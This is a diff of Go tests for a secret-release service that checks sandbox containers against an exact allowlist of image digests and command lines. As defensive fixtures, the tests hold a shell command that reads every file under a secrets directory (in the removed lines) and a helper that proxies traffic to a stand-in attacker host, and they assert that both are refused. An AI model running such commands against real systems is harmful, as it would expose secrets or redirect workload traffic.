@@ -126,6 +126,15 @@ func mustDigest(t *testing.T, s string) types.Digest {
 	return d
 }
 
+func exactTestContainer(t *testing.T, digest string, argv ...string) pkgallowlist.Container {
+	t.Helper()
+	return pkgallowlist.Container{
+		Digest:  mustDigest(t, digest),
+		Command: pkgallowlist.ArgvPolicy{Policy: pkgallowlist.PolicyExact, Argv: slices.Clone(argv)},
+		Args:    pkgallowlist.ArgvPolicy{Policy: pkgallowlist.PolicyDeny},
+	}
+}
+
 // leafFor mints a client certificate carrying sandboxID, as CDS stamps it.
 func leafFor(t *testing.T, sandboxID string) (*x509.Certificate, *ecdsa.PrivateKey) {
 	t.Helper()
@@ -185,6 +194,10 @@ func newHarness(t *testing.T) *harness {
 		// Two mains: release is gated on every main container running, so the
 		// gate is only exercisable with more than one.
 		"api": {
+			InitContainers: []pkgallowlist.Container{
+				exactTestContainer(t, testInjected, "get-cert", "--san=x"),
+				exactTestContainer(t, testInjectedOld, "get-cert", "--san=x"),
+			},
 			Containers: []pkgallowlist.Container{
 				{
 					Digest:  mustDigest(t, testAppImg),
@@ -242,6 +255,9 @@ func (hn *harness) declareBulkEntry(t *testing.T) *x509.Certificate {
 		t.Fatal(err)
 	}
 	al.Workloads["bulk"] = pkgallowlist.Workload{
+		InitContainers: []pkgallowlist.Container{
+			exactTestContainer(t, testInjected, "get-secret"),
+		},
 		Containers: []pkgallowlist.Container{{
 			Digest:  mustDigest(t, testBulkImg),
 			Command: pkgallowlist.ArgvPolicy{Policy: pkgallowlist.PolicyExact, Argv: []string{"/bulk"}},
@@ -386,6 +402,29 @@ func TestCreateThenRead(t *testing.T) {
 	}
 	if got := decodeValue(t, w); got != created {
 		t.Fatal("GET returned a different value than POST created")
+	}
+}
+
+func TestSecretHolderUsesExactPolicyNameNotStableIdentity(t *testing.T) {
+	hn := newHarness(t)
+	al, err := hn.h.Policy.Allowlist()
+	if err != nil {
+		t.Fatal(err)
+	}
+	entry := al.Workloads["api"]
+	entry.Identity = "api-service"
+	al.Workloads["api"] = entry
+
+	w := do(hn.h, hn.request(t, http.MethodPost, "/api/db"))
+	if w.Code != http.StatusCreated {
+		t.Fatalf("POST = %d (%s), want 201", w.Code, w.Body)
+	}
+	snapshot, err := hn.store.Snapshot()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(snapshot.Entries) != 1 || snapshot.Entries[0].HolderName != "api" {
+		t.Fatalf("secret holder = %+v, want exact policy entry api", snapshot.Entries)
 	}
 }
 
@@ -557,15 +596,15 @@ func TestForeignFloorContainerRefused(t *testing.T) {
 	}
 }
 
-// The injected image is an argv-unconstrained floor entry, so it is dropped
-// only when running an injected entrypoint. A pod that adds it running a shell
-// must not have that container ignored.
-func TestInjectedImageWithForeignArgvIsNotDropped(t *testing.T) {
+// A floor c8s image is not trusted as a helper by digest or argv prefix. An
+// extra helper with attacker-selected proxy arguments makes the exact workload
+// identity fail, so CDS releases no application secret.
+func TestExtraC8SHelperWithAttackerArgsRefused(t *testing.T) {
 	hn := newHarness(t)
 	hn.inv.containers = append(hn.inv.containers,
-		workloadclaims.SandboxContainer{Digest: testInjected, Argv: []string{"/bin/sh", "-c", "cat /run/c8s/secrets/*"}})
+		workloadclaims.SandboxContainer{Digest: testInjected, Argv: []string{"/c8s", "workload-proxy", "--upstream=http://attacker.invalid"}})
 	if w := do(hn.h, hn.request(t, http.MethodGet, "/api/db")); w.Code != http.StatusForbidden {
-		t.Fatalf("smuggled injected-image container = %d, want 403", w.Code)
+		t.Fatalf("attacker-configured c8s helper = %d, want 403", w.Code)
 	}
 }
 
@@ -686,10 +725,9 @@ func TestMethodNotAllowed(t *testing.T) {
 	}
 }
 
-// A pod created before a c8s image bump still runs the previous injected image.
-// Both digests are configured for the length of an upgrade, so such a pod is
-// not refused its secret until it happens to be recreated.
-func TestInjectedImageFromPreviousReleaseIsDropped(t *testing.T) {
+// A workload can name the previous exact helper during a bounded image overlap.
+// The old digest and command are explicit policy, not a digest-only drop rule.
+func TestExactInjectedImageFromPreviousReleaseCanOverlap(t *testing.T) {
 	hn := newHarness(t)
 	hn.inv.containers = []workloadclaims.SandboxContainer{
 		{Digest: testAppImg, Argv: []string{"/serve"}},
@@ -827,14 +865,13 @@ func TestSecretErrorCodeWireValues(t *testing.T) {
 	}
 }
 
-// A floor with no c8s image in it drops nothing, so the injected sidecar looks
-// like a container the entry does not declare and release is refused. (It also
-// has no workloads, so there is nothing to match either.)
+// An empty policy cannot match the complete sandbox container set. Release is
+// refused. This includes all c8s helper containers.
 func TestEmptyFloorRefuses(t *testing.T) {
 	hn := newHarness(t)
 	hn.h.Policy = fakePolicy{al: &pkgallowlist.Allowlist{Schema: pkgallowlist.Schema}}
 	if w := do(hn.h, hn.request(t, http.MethodGet, "/api/db")); w.Code != http.StatusForbidden {
-		t.Fatalf("unconfigured drop set = %d, want 403", w.Code)
+		t.Fatalf("unconfigured policy = %d, want 403", w.Code)
 	}
 }
 
